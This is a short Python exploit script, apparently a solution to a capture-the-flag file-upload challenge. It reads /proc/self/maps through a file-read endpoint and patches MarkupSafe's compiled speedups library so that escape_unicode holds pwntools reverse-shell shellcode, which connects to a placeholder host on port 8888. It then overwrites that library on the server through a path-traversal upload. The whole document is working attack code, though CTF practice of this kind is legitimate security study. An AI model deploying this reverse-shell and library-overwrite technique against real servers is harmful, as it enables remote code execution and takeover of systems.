from pwn import *
import requests


context.binary = lib = ELF("_speedups.cpython-312-x86_64-linux-gnu.so")

payload = asm(f"""
{shellcraft.connect("IPHERE", 8888)}
{shellcraft.dup2('rdi', 0)}
{shellcraft.dup2('rdi', 1)}
{shellcraft.dup2('rdi', 2)}
{shellcraft.sh()}
""")

maps = requests.post("https://fileupload-955e6008b72b4475.chals.uoftctf.org/read", data={"filename":"/proc/self/maps"}).text.splitlines()
print(maps)
for line in maps:
    line = line.split()
    if not line:
        continue
    if "_speedups.cpython-312-x86_64-linux-gnu.so" in line[-1]:
        addr = int(line[0].split('-')[0], 16)
        break
lib_file = bytearray(open("_speedups.cpython-312-x86_64-linux-gnu.so", 'rb').read())
print(hex(lib.symbols['escape_unicode']))
lib_file[lib.symbols['escape_unicode']:lib.symbols['escape_unicode'] + len(payload)] = payload
lib_file[0x30c8:0x30c8+8] = p64(addr + 0x1130)

try:
    print(requests.post("https://fileupload-955e6008b72b4475.chals.uoftctf.org/upload", files={"file":("/tmp/venv_flask/lib/python3.12/site-packages/markupsafe/_speedups.cpython-312-x86_64-linux-gnu.so", bytes(lib_file))}).text)
except:
    pass

